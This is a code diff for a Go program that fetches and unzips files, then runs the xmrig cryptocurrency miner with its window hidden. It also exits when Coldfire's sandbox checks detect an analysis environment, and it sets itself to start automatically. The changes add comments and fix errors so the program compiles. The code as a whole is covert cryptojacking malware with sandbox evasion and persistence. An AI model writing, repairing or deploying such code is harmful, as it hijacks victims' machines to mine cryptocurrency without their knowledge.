@@ -1,5 +1,7 @@
+// Main package
 package main
 
+// Import needed libraties
 import (
 	"archive/zip"
 	"fmt"
@@ -13,12 +15,12 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
-	"unsafe"
 
 	"golang.org/x/sys/windows"
 	"github.com/redcode-labs/Coldfire"
 )
 
+// func that downloads files
 func downloadFile(filepath string, url string) (err error) {
 	// Create the file
 	out, err := os.Create(filepath)
@@ -115,10 +117,7 @@ func unzipFile(f *zip.File, destination string) error {
 func startCommand(dir string) {
 	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
 
-	cmd.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow:  true,
-		WindowTitle: "Cortana",
-	}
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	if err := cmd.Start(); err != nil {
 		log.Printf("Failed to start cmd: %v", err)
@@ -176,8 +175,8 @@ func autoStart() {
 }
 
 func main() {
-	if Coldfire.SandboxAll() {
-		return 1
+	if coldfire.SandboxAll() {
+		os.Exit(0)
 	}
 	f, err := os.OpenFile("log.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
@@ -186,7 +185,7 @@ func main() {
 	defer f.Close()
 	log.SetOutput(f)
 
-	autostart()
+	autoStart()
 
 	dir, err := ioutil.TempDir("", "xmrminer")
 	if err != nil {
